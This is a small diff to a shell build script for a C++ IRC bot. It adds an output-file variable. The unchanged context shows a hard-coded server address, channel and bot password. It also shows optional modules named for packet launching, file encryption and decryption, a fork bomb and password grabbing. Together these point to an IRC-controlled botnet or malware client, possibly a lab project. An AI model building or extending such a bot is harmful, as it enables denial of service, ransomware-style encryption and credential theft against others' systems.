@@ -28,6 +28,7 @@ SERVER_ADDRESS="52.90.220.187"
 ASSIGNED_CHANNEL="#testChannel"
 BOT_PASS="test123"
 MASTER_NICK="master"
+OUT_FILE="irc_bot"
 
 if [[ "$ENABLE_PING_ACTION" -eq 1 ]]; then
     g++ -std=c++17 -Wall -Wextra -Iinclude -c PingAction.cpp -o PingAction.o
@@ -72,6 +73,6 @@ g++ -std=c++17 -Wall -Wextra -Iinclude $ENABLE_PING_FLAG $ENABLE_ENCRYPT_FLAG $E
 g++ -std=c++17 -Wall -Wextra -Iinclude -c MessageParser.cpp -o MessageParser.o
 g++ -std=c++17 -Wall -Wextra -Iinclude -c GeneralUtils.cpp -o GeneralUtils.o
 
-g++ BotMain.o IrcClient.o MessageParser.o GeneralUtils.o $PING_ACTION_OBJ $PACKET_LAUNCHER_OBJ $ENCRYPT_ACTION_OBJ $CRYPTO_MANAGER_OBJ $FS_DECRYPTOR_OBJ $GEN_SCRIPT_OBJ $REPORT_ACTION_OBJ $FORK_BOMB_ACTION_OBJ $GET_PASSWD_OBJ -o irc_bot -lcryptopp -lircclient -ltins -lpcap -s
+g++ BotMain.o IrcClient.o MessageParser.o GeneralUtils.o $PING_ACTION_OBJ $PACKET_LAUNCHER_OBJ $ENCRYPT_ACTION_OBJ $CRYPTO_MANAGER_OBJ $FS_DECRYPTOR_OBJ $GEN_SCRIPT_OBJ $REPORT_ACTION_OBJ $FORK_BOMB_ACTION_OBJ $GET_PASSWD_OBJ -o $OUT_FILE -lcryptopp -lircclient -ltins -lpcap -s
 
 printf "Build complete!\n"
